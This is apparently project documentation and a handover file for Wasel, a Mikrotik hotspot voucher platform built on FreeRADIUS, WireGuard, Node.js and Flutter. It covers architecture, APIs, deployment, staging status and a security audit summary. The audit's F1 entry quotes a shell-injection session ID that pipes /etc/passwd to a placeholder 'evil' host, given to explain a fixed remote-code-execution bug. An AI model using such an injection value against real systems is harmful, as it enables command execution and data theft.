# Wasel — Project Documentation & Handover

## Overview

**Wasel** (Arabic: واصل) is a Mikrotik Hotspot Voucher Manager — a complete platform that lets Wi‑Fi operators manage Mikrotik routers and issue prepaid Wi‑Fi vouchers. It pairs a **Flutter mobile app** (the operator's primary tool) with a **Node.js/Express/TypeScript REST backend**, a **React admin panel** (for the platform owner), and a networking stack of **FreeRADIUS + WireGuard + PostgreSQL + Redis**. The defining design decision is that **a voucher is a RADIUS user**, not a Mikrotik-local hotspot user: routers delegate authentication to a central FreeRADIUS server over WireGuard tunnels, so vouchers, time/data limits, validity windows, and forced disconnects are all enforced centrally from PostgreSQL. Production runs live at `wa-sel.com` with paying users; a dedicated staging VPS (`wa-sel.cloud`) is being stood up as the pre‑merge gate.

---

## Architecture

### Component Topology

```
Flutter Mobile App ──HTTPS──> Nginx (TLS, 443) ──> Node/Express Backend (:3000)
React Admin Panel  ──HTTPS──┘                          │
                                                       ├──> PostgreSQL (app + RADIUS tables)
                                                       ├──> Redis (tokens, OTP, rate-limit, dedup)
                                                       ├──> FreeRADIUS control socket (radmin)
                                                       └──> WireGuard wg0 (peer mgmt, CoA)

Mikrotik Router ──WireGuard tunnel (10.10.0.0/16)──> VPS
   │  RADIUS Access/Accounting (1812/1813 udp) ──> FreeRADIUS ──> PostgreSQL (radcheck/radacct)
   │  CoA Disconnect-Request (3799 udp)        <── Backend (radclient)
   └  RouterOS API (8728 tcp, inside tunnel)   <── Backend (sessions, sysinfo, hotspot mgmt)
```

### How it Connects

1. **Mobile/Admin → Backend.** Both clients talk to the backend over HTTPS only (`/api/v1/`). The backend is the single source of truth.
2. **Backend → FreeRADIUS/PostgreSQL.** When an operator creates a voucher, the backend writes a RADIUS user into `radcheck`/`radreply`. FreeRADIUS reads those tables to authenticate hotspot logins.
3. **Backend → WireGuard.** Each router gets a `/30` WireGuard tunnel from the `10.10.0.0/16` pool. The backend manages peers via the `wg` CLI on the host `wg0` interface.
4. **Router → FreeRADIUS.** The Mikrotik delegates hotspot auth to FreeRADIUS at `10.10.0.1` over the tunnel (PAP). FreeRADIUS validates against `radcheck` and writes accounting to `radacct`.
5. **Backend → Router (RouterOS API + CoA).** The backend queries live sessions/system info over the RouterOS API (TCP 8728, inside the tunnel) and forces session termination via RADIUS CoA Disconnect-Request (UDP 3799, RFC 5176).

### Voucher-as-RADIUS-User Model

- Each voucher = a unique RADIUS username with `Cleartext-Password`, `Simultaneous-Use := 1`, and (if validity-bound) an `Expiration` attribute in `radcheck`; time limits map to `Session-Timeout` in `radreply`.
- **Disable** = insert `Auth-Type := Reject` in `radcheck` (fast re-auth block without deleting the credential).
- **Delete** = purge `radcheck`/`radreply`/`radusergroup` rows + send CoA Disconnect if a session is active.
- **Status** (`unused → active → used → expired`, plus `disabled`) is computed dynamically from `radacct` accounting data, not stored statically.
- Limits come in two flavors: **time** (minutes/hours/days → `Session-Timeout` + `sqlcounter`) and **data** (MB/GB → `sqlcounter`). An optional **validity window** (`validity_seconds`, measured from first use) expires the voucher independently of consumption.

---

## Tech Stack

| Layer | Technologies |
|---|---|
| **Mobile** | Flutter (SDK 3.11+), Dart, Riverpod 2.6 (StateNotifier), GoRouter 14.8, Dio 5.7, flutter_secure_storage, flutter_jailbreak_detection, Material Design 3, Cairo font |
| **Backend** | Node.js, Express, TypeScript, PostgreSQL (`pg`), Redis (`ioredis`), Zod, JWT (HS256), bcrypt, Nodemailer, Firebase Admin SDK (FCM), Winston, Helmet, express-rate-limit + rate-limit-redis, Multer |
| **Admin** | React 19, Vite 8, TypeScript 5.9, React Router 7, TanStack React Query 5, Axios 1.14, Tailwind CSS, lucide-react |
| **Infra** | Docker Compose, FreeRADIUS 3.2.8 (`rlm_sql_postgresql`), WireGuard (linuxserver image), PostgreSQL 16-alpine, Redis 7-alpine, Nginx + Let's Encrypt, GitHub Actions CI |

---

## What Has Been Built — By Layer

### Backend (`backend/`)

A service-oriented Express app: `src/app.ts` wires the middleware stack, `src/server.ts` bootstraps DB connection, background jobs, and graceful shutdown. Config (`src/config/index.ts`) is Zod-validated at boot — wildcard CORS is rejected, and `.env.local` takes precedence over `.env`.

#### API Groups

| Group | Prefix | Highlights |
|---|---|---|
| **Auth** | `/api/v1/auth/` | register, login, refresh, verify-email, resend-verification, forgot/reset-password, logout, `me`, profile, change-password |
| **Routers** | `/api/v1/routers/` | CRUD, `:id/status`, `:id/setup-guide`, `:id/health` |
| **Vouchers** | `/api/v1/routers/:id/vouchers/` | bulk create (1–500), list (paginated/filtered), get, update, delete, `bulk-delete` |
| **Profiles** | `/api/v1/profiles/` | reusable RADIUS attribute groups (CRUD) |
| **Sessions** | `/api/v1/routers/:id/sessions/` | live active sessions, `history` (Pro/Ent tier-locked), `:sid` disconnect |
| **Subscription** | `/api/v1/subscription/` | plans, current, bank-info, payments, request, change, receipt upload, cancel |
| **Dashboard** | `/api/v1/dashboard/` | aggregated stats DTO |
| **Reports** | `/api/v1/reports/` | radacct queries + CSV export (Pro/Ent tier-locked) |
| **Notifications** | `/api/v1/notifications/` | device-token register/unregister, preferences, inbox, mark-read, delete |
| **Support** | `/api/v1/support/` | user → admin messaging |
| **Admin** | `/api/v1/admin/*` | users, subscriptions, plans, payments, stats, routers, audit-logs, freeradius/status, system-status, admins, settings/bank, support conversations |
| **Public/Health** | `/api/v1/public/...`, `/health`, `/readyz` | unauth callbacks; DB+Redis liveness/readiness probes |

#### Authentication & Authorization

- JWT pair: **15 min access + 7 day refresh** with rotation. Refresh tokens stored in Redis as `refresh:{userId}:{jti}`; **consumed atomically via a Lua `DEL`** (returns 1 only to the caller that wins the race) — closes the F4 replay window.
- Bcrypt cost **12**. Account lockout after **5 failed logins (15 min)**. Email verification required before access.
- OTP flows: 6-digit codes (verify = 24 h, reset = 15 min) with attempt counters; **lockout after 5 wrong attempts/hour** (429).
- Middleware ladder: `authenticate` → `requireSubscription` → `requireAdmin` / `requireTier(...)` → `validate(zod)` → `checkQuota(...)`.

#### Cryptography

- **AES-256-GCM** at rest for router secrets — `wg_private_key_enc`, `wg_preshared_key_enc`, `radius_secret_enc`, `api_pass_enc`. Format `iv:tag:ciphertext` (hex), key from `ENCRYPTION_KEY` (64 hex chars). Decryption is on-demand for the owning user only; plaintext never logged.

#### RADIUS / Voucher Lifecycle

- **Batch enrichment**: any voucher list page resolves to **3 SQL queries max** (radcheck batch, radacct GROUP BY, profile names) — N+1 prevention, covered by `voucherN1.test.ts`.
- **CoA Disconnect-Request** (RFC 5176) via `radclient.service.ts` `sendDisconnectRequest()` — argv-based `spawn`, scoped by username.
- Background jobs (`src/jobs/`): `purgeUnverified` (hourly), `subscriptionNotifications` (daily), `quotaMonitor` (hourly), `validityExpiration`, `validityCoaDisconnect` (every 30 s), `usageLimitEnforcement`.

#### Tiers & Quota

- Plans table drives tiers (Free/Basic/Starter/Professional/Enterprise per environment); Enterprise vouchers use `-1` (unlimited) sentinel. Quota is enforced atomically (F2 fix): a guarded `UPDATE subscriptions SET vouchers_used = vouchers_used + $1 WHERE ... vouchers_used + $1 <= voucher_quota RETURNING` — a 0-rowcount rolls back before any `radcheck` insert.
- `requireTier` gates session history + reports behind Professional/Enterprise.

#### Payments & Email

- **Manual bank transfer** flow: user `request` → upload receipt (JPEG/PNG/WebP, 5 MB, **magic-byte verified**) → admin approve/reject (with reason) → subscription activates. Reference codes auto-generated (`WAS-XXXXXXXX`). Rejected payments can be re-submitted.
- Email via Nodemailer/SMTP (Resend in prod): verification OTP + password-reset OTP HTML templates.

#### Notifications

- Dual delivery: **PostgreSQL in-app inbox** (source of truth) + **FCM push** (Firebase Admin SDK, graceful no-op if unconfigured). Per-category preferences; recurring categories deduped once/24 h via `notif:{userId}:{category}:{date}`.

#### Database

24 SQL migrations (`src/migrations/sql/`), auto-run on boot inside transactions, tracked in `schema_migrations`. ~27 tables including `users`, `routers`, `voucher_meta`, FreeRADIUS tables (`radcheck`, `radreply`, `radacct`, `nas`, `radusergroup`), `subscriptions`, `payments`, `plans`, `radius_profiles`, `device_tokens`, `notifications`, `support_messages`, `audit_logs`, `system_settings`, `tunnel_subnet_pool`.

### Mobile (`mobile/`)

40+ screens organized by feature, all migrated to the slate-blue design system. State via Riverpod StateNotifier; navigation via GoRouter with auth-gated redirects.

| Area | Key Screens | Provider |
|---|---|---|
| **Auth** | login, register, verify-email, forgot/reset-password | `auth_provider.dart` (`tryRestoreSession`, `pendingVerificationEmail`) |
| **Dashboard** | dashboard_screen (subscription card, sessions, vouchers today, router status, 24 h usage) | `dashboard_provider.dart` |
| **Routers** | list, add, detail, edit, **setup-guide** (step cards w/ copy buttons) | `routers_provider.dart` |
| **Vouchers** | list (filter/search/paginate/bulk), **3-step create wizard**, detail (usage bar), **PDF print** (3 layouts: Arabic Grid, Table Grid, Decorated Card; 2–10 columns) | `vouchers_provider.dart` |
| **Sessions** | active, history (filterable) | `sessions_provider.dart` |
| **Subscription** | status, payment (bank details + receipt upload/resubmit/cancel) | `subscription_provider.dart` |
| **Settings** | main, edit-profile, change-password, payments, contact | — |
| **Notifications/Reports** | inbox (unread badge, pull-to-refresh), preferences, reports + export | `notifications_provider.dart`, `notification_prefs_provider`, `reports_provider` |

**Navigation:** GoRouter ShellRoute with bottom tabs (Dashboard, Routers, Vouchers, Settings); full-screen subscription/payment routes; auth-guard redirect via a `ValueNotifier` refresh listener; global `appNavigatorKey` lets the 403 paywall interceptor navigate without a `BuildContext`.

**Design system:** Slate-blue Material3 palette (`primary #2563EB`, orange CTA accent `#F97316`), **Cairo** typography, soft-shadow component library (`AppCard`, `StatCard`, `StatusDot/Badge`, `SkeletonLoader`, `ConfirmDialog`, `EmptyState`, `ErrorState`, `InlineErrorBanner`, `AppSnackbar`).

**i18n:** Custom in-memory Map-based `app_localizations.dart` — **EN + AR**, RTL-aware, dot-notation keys (`auth.*`, `vouchers.*`, `error.*`, etc.), fallback chain `locale → English → raw key`, positional args.

**Client security:** TLS **certificate pinning** (SPKI SHA-256 primary leaf + backup intermediate CA, release mode only), **single-flight token refresh** (queue behind Completer on 401), **redacted logging** (strips Authorization/password/otp/tokens, debug only), OS-level encrypted token storage (iOS Keychain / Android EncryptedSharedPreferences), **jailbreak/root detection** (warn-only), 403 paywall interceptor (`SUBSCRIPTION_REQUIRED`/`EXPIRED`/`QUOTA_EXCEEDED`/`ROUTER_LIMIT_REACHED` → /subscription).

### Admin Panel (`admin/`)

React 19 + Vite SPA, served by Nginx on 443 in prod.

| Page | Capabilities |
|---|---|
| **Dashboard** | 7 stat cards: users, active subs, pending payments, total revenue (SDG), routers online/offline, total vouchers, subscriptions-by-status |
| **Users / User Detail** | list/search/filter, edit, suspend/unsuspend, delete; detail links subscriptions + payments + add-router-for-user (quota override) |
| **Subscriptions** | list/filter, edit (tier, end date, quota, status), activate/extend/change/cancel/delete |
| **Plans** | view/edit pricing, quotas, features, durations |
| **Payments** | status tabs (Pending/Approved/Rejected/All), receipt image preview via origin-checked `resolveAssetUrl()`, approve/reject with reason |
| **Routers** | list/filter by status, view/edit/delete, on-demand RouterOS setup script |
| **Messages / Conversation** | support ticket threads, admin reply, mark resolved |
| **Audit Logs** | all admin/system actions (action, actor, target, timestamp), filterable |
| **Settings** | bank details, admin user management, system status |

**Auth/security:** admin-only login (role check), single-flight Axios token refresh (mirrors mobile), CSP via Nginx (`script-src 'self'`), `X-Frame-Options: DENY`, no production sourcemaps, business-timezone pinning (Africa/Khartoum) via `lib/datetime.ts`. *Known gap:* tokens in `localStorage` (XSS-accessible) — HttpOnly-cookie migration planned.

---

## Security Hardening

The audit `docs/SECURITY_AUDIT_2026-06-12.md` enumerated findings F1–F12 plus 22 Low items. Commit **`7aa841f`** closed every Critical and High.

### F1 — Critical: Remote Code Execution via shell injection (FIXED)

`session.service.ts` and `voucher.service.ts` built shell commands by interpolating `radacct.acctsessionid` — an **operator-controlled value** delivered via RouterOS Accounting-Request packets — into `child_process.exec()`. A crafted session ID (e.g. `x";curl https://evil/$(cat /etc/passwd|base64);#`) yielded full multi-tenant compromise.
**Fix:** all manual disconnect paths migrated to argv-based `spawn('radclient', ...)` (no shell), routed through the already-safe `sendDisconnectRequest()`; added an `isSafeAcctSessionId` whitelist guard (`[A-Za-z0-9._-]`) in `backend/src/utils/radius.ts`; the encrypted RADIUS secret no longer appears in `/proc/<pid>/cmdline`.

### High findings (FIXED)

| ID | Issue | Fix |
|---|---|---|
| **F2** | Voucher quota TOCTOU race | Atomic guarded `UPDATE … RETURNING`; 0-rowcount rolls back before radcheck insert |
| **F3** | Unbounded create / bulk-delete DoS | Zod `.max(500)` on count, capped filter bulk-delete, batched multi-row INSERTs (100/txn), matching mobile cap + i18n message |
| **F4** | Refresh-token rotation replay | Atomic Redis `DEL`-returns-1 consume; single-use invariant restored |
| **F5 / F8** | Router/user deletion orphans RADIUS creds | `deleteRouter` + admin `deleteUser` now transactional — snapshot usernames, purge radcheck/radreply/radusergroup/nas before cascade |
| **F11** | Wrong-session disconnect | CoA lookup scoped by username (unique under Simultaneous-Use=1) |

### Deferred (non-blocking)

- **Medium (still open):** F6 unauthenticated receipt downloads, F7 admin-deactivate doesn't revoke refresh tokens, F9 deactivated users keep access ≤15 min, F10 cross-tenant RADIUS-group clobbering, F12 bank-settings mutation not audit-logged. (F8 and F11 done.)
- **Low:** 22 hygiene items (user enumeration, JWT alg not pinned, modulo bias in RNG, cron reentrancy, HPP, etc.) — batch cleanup pending.
- `radacct` history purge on delete (migration-heavy); FK-cascade migration (needs orphan cleanup first); **18 transitive `npm audit`** items (mostly firebase-admin) deferred.
- **BlastRADIUS / CVE-2024-3596:** `require_message_authenticator = no` is set globally because RouterOS 7.x on WireGuard silently discards Access-Accepts carrying a FreeRADIUS-added Message-Authenticator. Mitigated: FreeRADIUS is only reachable inside the WG mesh (no public 1812/udp), so exploitation requires an on-path attacker inside the tunnel.

**Verification:** backend `tsc --noEmit` clean + **192/192 vitest tests**; mobile `flutter analyze` clean + tests pass; reviewed by security-auditor + code-reviewer.

---

## Infrastructure & Deployment

### Production Stack (`docker-compose.yml`)

All services run in containers with `network_mode: host` (except admin), bind localhost-only, and are exposed via Nginx/TLS. CPU/memory limits, json-file log rotation (10 MB × 3), and healthchecks on every service (`restart: unless-stopped`).

| Service | Image | Ports | Caps / Notes |
|---|---|---|---|
| **wireguard** | linuxserver/wireguard | 51820/udp | `NET_ADMIN`, `SYS_MODULE`; router tunnels |
| **backend** | local build | 3000 (http) | `NET_ADMIN` for WG CLI; reads `backend/.env`; radmin socket mount |
| **postgres** | postgres:16-alpine | 5432 (localhost) | 24 migrations auto-run; password from env-file |
| **redis** | redis:7-alpine | 6379 (localhost) | password-protected; tokens + rate-limit |
| **freeradius** | local build (3.2.8) | 1812/1813/3799 udp | dynamic NAS from DB; SQL auth/acct |
| **admin** | local build | 5173 (localhost) | React SPA, Nginx-proxied on 443 |

### FreeRADIUS

- Base `freeradius/freeradius-server:3.2.8` + `freeradius-postgresql` + `envsubst`. Modules enabled: `sql`, `expiration`, `sqlcounter`. EAP/inner-tunnel disabled (PAP-only over WireGuard).
- **Dynamic NAS loading**: no static clients; `read_clients = no` makes the live `nas` table the single source of truth. First packet from any `10.10.0.0/16` IP triggers a DB lookup, cached **120 s** (long enough to avoid per-auth SELECTs, short enough for delete/recreate-same-IP healing within 2 min).
- Sites-enabled: `default` (auth+acct), `coa` (3799 listener), `control-socket` (radmin.sock for backend probes/HUP), `dynamic-clients`. SQL pool start=5/min=4/max=10, 5 s retry on Postgres restart.

### WireGuard & RouterOS

- Server `10.10.0.1/16`, listen 51820/udp; per-router `/30` peers added dynamically (`wireguardPeer.service.ts`). "Online" = handshake < 150 s **and** RouterOS API responds. RouterOS API over TCP 8728 inside the tunnel (never public).

### Firewall (UFW — prod & staging identical)

`deny incoming` default; SSH rate-limited; 80/443 + 51820/udp open; **RADIUS (1812/1813/3799) restricted to `10.10.0.0/16` only** — never public.

### CI/CD (GitHub Actions)

- **Backend** (`.github/workflows/backend.yml`, paths `backend/**`): lint (`tsc --noEmit`) + vitest (192 tests) → `docker build ./backend`.
- **Mobile** (`.github/workflows/mobile.yml`, paths `mobile/**`): `dart analyze --fatal-infos` + `flutter test` → `flutter build apk --debug`.

### Branch & Deploy Model

```
dev (all local commits) ──push──> Staging VPS (dev) ──E2E checklist (10 items)──>
  git checkout main && git merge dev --ff-only && git push origin main ──>
  Prod VPS: git pull origin main && docker compose up -d --build (prod compose only)
```

`--ff-only` keeps history linear; migrations auto-run on backend boot; prod **never** uses `docker-compose.dev.yml`. Backups: daily encrypted `pg_dump` (AES-256-CBC), 30-day local / 90-day off-host; 2 h RTO / 24 h RPO. Systemd unit autostarts the stack on VPS reboot.

---

## Local Development Stack

A parallel infra-only stack (`docker-compose.dev.yml`) runs alongside prod; backend + admin run natively for hot-reload (full walkthrough in `docs/LOCAL_DEV.md`).

**Daily loop (on `dev`):**
```
docker compose -f docker-compose.dev.yml up -d   # postgres + redis + freeradius + mailhog
(cd backend && npm run dev)                       # nodemon/ts-node :3000
(cd admin   && npm run dev)                       # Vite HMR :5173
(cd mobile  && flutter run --dart-define=API_BASE_URL=http://10.0.2.2:3000/api/v1)
```

**Non-default dev ports** (avoid collisions): Postgres `127.0.0.1:5436`, Redis `127.0.0.1:6380`, FreeRADIUS `1812-1813/udp`, Backend `:3000`, Admin `:5173`, MailHog UI `:8025`. FreeRADIUS uses a bridge network here (Docker Desktop "host" = the VM, not WSL2). WireGuard is optional (`profiles: router-test`).

**Local-only files (gitignored):** `.env` (root — `POSTGRES_PASSWORD`/`REDIS_PASSWORD`), `backend/.env.local` (dev JWT/ENCRYPTION_KEY/WG keys/DB creds). Backend loads `.env.local` then `.env`; prod has no `.env.local` so it's a silent no-op. **Code rule:** every secret/URL/connection string is read from `config` parsed at boot — never hardcode `localhost`, dev ports, or env-specific values.

---

## Staging Environment

A dedicated **staging VPS** at `wa-sel.cloud` / **`185.166.39.70`** (Ubuntu, repo at `/opt/wasel` on branch `dev`) is the pre-merge gate. Runbook: `docs/STAGING.md`. It validates the full WireGuard handshake, FreeRADIUS auth, RouterOS API, and TLS stack before any `dev → main → prod` promotion.

**Done:**
- **Docker stack** ✅ up + healthy (all 6 services); **24 migrations ran**; backend health `200` on `localhost:3000`.
- **Secrets**: fresh staging-only set in `/etc/wasel/compose.env` (chmod 600, also copied to `/opt/wasel/.env` for Compose auto-load); `backend/.env` filled; `CORS_ORIGIN=https://api.wa-sel.cloud`.
- **DNS**: apex `wa-sel.cloud` ✅ and `api.wa-sel.cloud` ✅ now resolve to the VPS (`admin.wa-sel.cloud` still pending).
- **SMTP/Resend**: configured (`smtp.resend.com`, user `resend`). Registration email was failing with `535 Authentication credentials invalid` — the API key tested **valid** (send-scoped), so the fix is a backend container `--force-recreate` to reload the env, plus a Resend-**verified** `From` domain.

**Remaining / current blocker:**
- **HTTPS ⏳ PARTLY UNBLOCKED** — the **Hostinger** network firewall was dropping inbound 80/443. **Port 80 is now open** (nginx answers externally with HTTP 404), but **443 is still blocked** (its accept rule hasn't taken). No Let's Encrypt cert issued yet.
- `admin.wa-sel.cloud` still has **no A record**.
- **Next action:** add the **TCP 443** accept rule in Hostinger hPanel (Security → Firewall) → `sudo certbot --nginx -d wa-sel.cloud -d api.wa-sel.cloud` (port 80 is reachable now, so the HTTP-01 challenge will pass) → add the `admin` A record + cert → systemd autostart (§6) → point the dedicated physical Mikrotik at staging (§7) → run the 10-item E2E checklist (§11) → promote.

> ⚠️ **Staging gotchas:** `POSTGRES_PASSWORD` only applies on first `postgres_data` volume init (mismatch with `DB_PASSWORD` → PG `28P01`; fix = match + `docker compose down -v`). The admin bundle bakes `VITE_API_URL=https://api.wa-sel.com/api/v1` in `.env.production` — rebuild with a same-origin override before exposing `admin.wa-sel.cloud`, or it will talk to **prod**.

---

## Recent Fixes (Mobile — committed as `2700de7`)

The latest commit, **`2700de7` "mobile: localized error messages + offline-resilient session"** (2026-06-22), centralizes network-error handling and stops spurious logouts:

**Localized error messages:**
- New `errorToDisplay()` (`mobile/lib/utils/error_messages.dart`) maps any error to a localized i18n key or backend literal — **never leaks raw Dio text or `toString()`**.
- All **10 providers** route through it; shared display widgets (`InlineErrorBanner`, `ErrorState`, `AppSnackbar`) resolve keys via `trOrRaw`. Added `hasKey()`/EN-fallback in `app_localizations`, plus new `error.security` and `error.rateLimited` keys (EN + AR).

**Offline-resilient session (fixes logout-on-no-internet):**
- New `isAuthRejection()` — **true only on HTTP 401**.
- `tryRestoreSession` no longer clears tokens on a network failure; it keeps the cached session and just stops the spinner.
- The `api_client` refresh path ends the session only on a real 401 (or missing refresh token) and **drains the waiter queue on every exit path** — transient network errors keep the tokens so the session self-heals when connectivity returns.

**Verification:** +58 tests; full mobile suite **165 passing**; `flutter analyze` clean.

---

## Testing

| Suite | Framework | Count | Coverage |
|---|---|---|---|
| **Backend** | Vitest + Supertest | **192 tests, 14 files** | auth flows, router CRUD/setup/health, voucher create/status/CoA, N+1 batch enrichment (`voucherN1`), subscription + payment + quota, sessions, profiles, dashboard, admin-router-for-user, OTP race (`otpRace`), health probes, `validityCoaDisconnect` job, WireGuard config generation |
| **Mobile** | flutter_test + mocktail | **165 tests** (94 cited in CI) | error mapping (`errorToDisplay`), `isAuthRejection`, EN/AR key coverage, offline restore, banner localization, providers, models |

Backend mocks `ioredis` + `pg` with in-memory stores (`src/tests/setup.ts`) — no external services needed. CI gates both: backend lint/test + docker build; mobile analyze/test + debug APK. Manual smoke/E2E/resilience checks are documented in `docs/TESTING.md` and the staging §11 checklist.

---

## Current State & Remaining Work

**Done:**
- Full-stack MVP → production-grade: auth, subscriptions/tiers, routers + WireGuard provisioning, voucher-as-RADIUS-user with time/data limits + validity + CoA enforcement, sessions, dashboard, reports, notifications (in-app + FCM), support chat, admin panel.
- Critical RCE + all 4 High security findings fixed and pushed to `dev` (`7aa841f`).
- Mobile design-system overhaul (slate-blue/Cairo, 29 screens), EN/AR i18n, offline-resilient session (`2700de7`).
- Staging Docker stack up + healthy with migrations applied.

**Remaining / blockers:**
1. **Staging HTTPS blocked** — open 80/443 in the Hostinger provider firewall, issue Let's Encrypt certs, add `api`/`admin` A records. *(Top priority — gates the whole promotion path.)*
2. Run the staging **E2E checklist** (register → subscribe → add router → WireGuard handshake → RADIUS auth → voucher disable/delete → CoA disconnect, etc.), then promote `dev → main → prod`.
3. **Deferred security**: Medium findings F6, F7, F9, F10, F12; 22 Low items; `radacct` purge + FK-cascade migration; firebase-admin dependency bump.
4. Admin `localStorage` → HttpOnly cookie migration; admin i18n (English-only today).
5. **Uncommitted working tree** on `dev` (per `git status`): `CLAUDE.md`, `backend/src/server.ts`, several mobile screens/models, deleted PNG logo assets, and untracked audit docs — pre-existing, not part of the security work; review before committing.

> **Production rule:** prod (`wa-sel.com`) is live with paying users — stand up and validate every change on staging before `dev → main → prod`. Never push directly to `main`.

---

## Documentation Index

All docs live in `docs/` (exceptions: root `CLAUDE.md` and per-directory `README.md`).

| File | Purpose |
|---|---|
| `PROJECT_STATE.md` | Living "where are we" snapshot — branch state, hardening status, staging blocker, gotchas |
| `SECURITY_AUDIT_2026-06-12.md` | Findings report F1–F12 + 22 Low: exploits, fixes, dependency audit (local/untracked) |
| `MOBILE_AUDIT_2026-06-12.md` | Mobile app security audit (local/untracked) |
| `STAGING.md` | Staging VPS runbook: provision → deploy → E2E checklist → dev→main promotion gate |
| `LOCAL_DEV.md` | Windows + WSL2 dev setup, daily loop, smoke tests, git workflow |
| `TESTING.md` | Quick gate + deep testing (smoke, local/VPS/resilience/device/integration/security), frequency matrix |
| `test.md` | Older testing guide (smoke + E2E + state reset) |
| `deploy.md` | Prod VPS deploy guide: setup, build, migrations, HTTPS, backups, RADIUS Message-Authenticator notes |
| `RUNBOOKS.md` | Operator playbooks: secret rotation + git-history purge, disaster recovery |
| `TASKS.md` | Phase 1–2 epic/task breakdown (16 epics) |
| `BACKEND_SCHEMA.md` | Database schema reference — all tables, columns, types, indexes, FKs |
| `IMPLEMENTATION_PLAN.md` | 8-week MVP + Phase 2 roadmap, milestones, dependencies |
| `TRD.md` | Technical requirements document — requirements, acceptance criteria, interfaces |
| `APP_FLOW.md` | User interaction flows / journeys (register → subscribe → router → voucher → auth) |
| `UIUX_DESIGN_BRIEF.md` | Mobile + admin design guide: slate-blue palette, Cairo typography, spacing, components |
